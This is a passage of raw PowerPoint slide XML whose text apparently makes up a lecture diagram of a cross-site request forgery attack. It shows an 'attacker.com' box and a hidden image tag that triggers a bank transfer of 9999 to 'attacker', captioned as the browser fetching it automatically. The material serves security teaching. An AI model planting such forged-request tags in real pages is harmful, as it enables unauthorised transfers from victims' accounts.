                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83977" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83983" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83984" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83985" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8517872" y="4406713"/>
            <a:ext cx="1881187" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83986" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
